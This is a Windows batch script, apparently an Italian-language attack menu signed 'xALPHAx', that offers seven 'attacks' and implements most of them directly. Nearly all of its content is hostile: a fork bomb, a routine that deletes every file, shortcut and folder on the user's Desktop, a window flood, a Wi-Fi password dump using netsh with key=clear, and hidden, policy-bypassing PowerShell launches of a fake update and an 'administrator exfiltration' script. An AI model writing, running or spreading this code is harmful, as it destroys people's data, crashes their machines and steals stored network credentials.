@echo off 
chcp 65001 >nul
:start                                                                    	                                                                      
cls
echo.                                                                                                                                        
echo	▒█████    ███▄ ▄███▓ ▓█████   ▄████   ▄▄▄      
echo	▒██▒  ██▒ ▓██▒▀█▀ ██ ▒▓█   ▀  ██▒ ▀█ ▒▒████▄    
echo	▒██░  ██▒ ▓██    ▓██ ░▒███   ▒██░▄▄▄ ░▒██  ▀█▄  
echo	▒██   ██░ ▒██    ▒██  ▒▓█  ▄ ░▓█  ██ ▓░██▄▄▄▄██ 
echo	░ ████▓▒░ ▒██▒   ░██ ▒░▒████▒░▒▓███  ▒ ▓█   ▓██▒
echo	░ ▒░▒░▒░  ░ ▒░   ░  ░░░ ▒░ ░ ░▒   ▒    ▒▒   ▓▒█░
echo	░ ▒ ▒░ ░   ░      ░ ░ ░  ░  ░   ░    ▒   ▒▒ ░
echo	░ ░ ░ ▒   ░      ░      ░   ░ ░    ░   ░   ▒   
echo		░ ░         ░      ░  ░      ░       ░  ░                                                                                                                                                 
echo.
echo.
echo========================================================                                                                                                                                          
echo SCRIPT MADE BY xALPHAx
echo LISTA ATTACCHI
echo [1] Ciccio Flood
echo [2] Folders Flood
echo [3] Fork Bomb
echo [4] Desktop madness
echo [5] Wi-Fi passworld dump
echo [6] Update-Hook
echo [7] Administrator exfiltration 
SET /P ANSWER=Attacco desiderato? 
echo Hai scelto: %ANSWER%
echo.
IF "%ANSWER%"=="1" goto :c
IF "%ANSWER%"=="2" goto :f
IF "%ANSWER%"=="3" goto :b
IF "%ANSWER%"=="4" goto :getdesktopname
IF "%ANSWER%"=="5" goto :wifi
IF "%ANSWER%"=="6" goto :fakeupdate
IF "%ANSWER%"=="7" goto :admin
pause
echo Scelta non valida.
goto :start

:c
for /l %%i in (1,1,15) do start "" cmd /k "%~dp0Ciccio_flood.bat"
pause
goto:end

:f
md "%random%"
start "" "%~dp0folder.bat"
goto:end

:b
%0|%0
goto:b

:getdesktopname
for %%d in (%USERPROFILE%\Desktop\*.lnk) do echo %%d
for /d %%a in (%USERPROFILE%\Desktop\*) do echo %%a
for %%g in (%USERPROFILE%\Desktop\*.lnk) do del %%g
for %%f in (%USERPROFILE%\Desktop\*) do del %%f
for /d %%d in ("%USERPROFILE%\Desktop\*") do rmdir /s /q "%%d"
pause

SET /P RETURN Tornare al menù Y/N?
if "%RETURN%"=="Y" goto :start

:wifi
netsh wlan show profiles
:nome
echo Inserisci Nome Network:
set /p network=
netsh wlan show profile name="%network%" key=clear
SET /P RETURN Tornare al menù Y/N?
if "%RETURN%"=="Y" goto :start
goto:nome

:fakeupdate
start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0fakeupdate.ps1"
pause
goto:end

:admin
start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0amministratore.ps1"
pause
goto:end

:end  
goto :start     
